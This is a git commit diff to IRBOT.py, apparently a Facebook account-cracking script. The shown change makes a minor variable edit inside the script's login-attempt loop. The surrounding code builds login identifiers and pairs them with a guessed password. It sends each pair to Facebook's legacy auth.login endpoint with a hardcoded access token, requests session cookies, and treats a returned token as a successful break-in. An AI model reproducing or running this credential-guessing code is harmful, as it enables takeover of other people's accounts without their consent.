9af1fe0bec8e89116195c006f631d3fbc1e5cc05
Md.Rabby <91461469+inceptionff@users.noreply.github.com>
2022-11-02 13:46:44 +0600

    Update IRBOT.py

--- IRBOT.py
+++ IRBOT.py
@@ -263,8 +263,7 @@ def action():
  
         try:
             result = k + c + user
-            digi6 = bangladesh
-            pass1 = digi6
+            pass1 = bangladesh
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
